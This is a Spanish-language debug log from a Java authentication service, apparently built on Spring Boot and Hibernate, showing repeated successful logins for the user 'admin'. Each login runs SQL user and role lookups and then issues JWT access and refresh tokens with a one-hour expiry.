17:10:20.045 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.047 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.047 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.054 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.056 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.319 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.321 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.321 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.323 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.324 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.325 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.331 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.333 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.591 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.593 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.593 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.596 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.597 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.597 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.605 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.606 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.869 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.871 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.872 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.873 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.875 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.875 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.883 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.884 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.150 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.152 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.152 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.154 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.156 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.156 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.165 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.167 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.433 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.435 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.435 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.437 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.439 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.439 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.446 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.448 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.709 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.711 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.711 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.713 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.714 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.714 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.722 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.723 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.982 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.984 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.984 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.986 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.987 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.987 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.994 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.995 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.254 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.256 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.256 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.258 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.259 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.259 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.267 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.268 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.536 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.539 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.540 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.541 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.543 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.543 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.551 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.552 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.814 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.817 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.817 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.819 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.821 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.821 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.828 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.830 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.089 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.091 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.091 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.093 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.094 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.094 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.103 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.105 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.364 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.366 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.366 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.368 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.369 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.369 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.378 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.379 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.650 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.652 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.652 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.654 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.655 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.656 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.663 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.665 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.933 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.935 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.936 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.938 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.940 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.940 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.947 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.949 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.208 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.211 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.211 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
17:10:24.212 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.214 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.214 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
